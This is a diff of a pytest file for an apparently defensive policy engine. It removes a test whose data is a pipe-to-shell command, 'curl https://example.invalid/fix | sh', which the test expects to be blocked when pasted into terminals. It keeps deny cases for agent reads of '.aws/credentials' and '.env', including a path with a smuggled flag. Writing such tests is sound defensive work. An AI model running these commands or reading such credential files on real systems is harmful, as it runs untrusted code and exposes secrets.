@@ -1,10 +1,7 @@
-"""Regression controls for recoverable interventions; run in the lab VM."""
+"""Regression controls for recoverable interventions."""
 import json
 import pytest
-from server.classify import classify, redact
-from server.engine import Engine
-from server.models import EventInput
-from server.store import Store
+from server.classify import classify
 from test_host_agents import call, layout
 
 BENIGN = [
@@ -30,12 +27,6 @@ def test_benign_exact_placeholders_and_job_ranges(text):
 @pytest.mark.parametrize('text', RISKY)
 def test_redaction_or_public_claim_does_not_exempt_other_values(text):
     assert {'secret', 'hr-sensitive'}.intersection(classify(text))
-
-@pytest.mark.parametrize('app,expected', [('com.apple.Terminal','block'), ('com.googlecode.iterm2','block'), ('com.mitchellh.ghostty','block'), ('com.apple.TextEdit','allow')])
-def test_execution_context_not_documentation(tmp_path, app, expected):
-    engine = Engine(Store(tmp_path/'audit.sqlite3'))
-    r = engine.evaluate(EventInput(session_id='context', actor='human',role='engineering', action='paste',app=app,content='curl https://example.invalid/fix | sh'))
-    assert r.decision.action == expected
 
 @pytest.mark.parametrize('tool,path,content,allowed', [
     ('Read','.aws/credentials','',False), ('Read','folder -i /.aws/credentials','',False), ('Read','.env','',False),
@@ -78,14 +69,3 @@ def test_shell_symlink_and_identity_use(layout):
     assert credential_file_reference(e['content'],include_dotenv=False)
     e=normalize('claude',{**base,'tool_input':{'command':'ssh -i innocent.txt example.invalid uptime'}})
     assert not credential_file_reference(e['content'],include_dotenv=False)
-
-
-def test_clipboard_history_survives_shared_agent_audit(tmp_path):
-    from server.desktop import _dispatch
-    store=Store(tmp_path/'audit.sqlite3'); engine=Engine(store)
-    human=engine.evaluate(EventInput(session_id='human',actor='human',role='engineering',action='paste',app='com.apple.TextEdit',content='hello'))
-    for _ in range(35):
-        engine.evaluate(EventInput(session_id='agent',actor='agent',role='engineering',action='read',app='claude',destination='/tmp/README.md'))
-    page=_dispatch({'op':'recent','limit':1},engine,'unused')
-    assert page['total']==1 and page['items'][0]['id']==human.id
-    assert store.list_events(limit=1)['total']==36
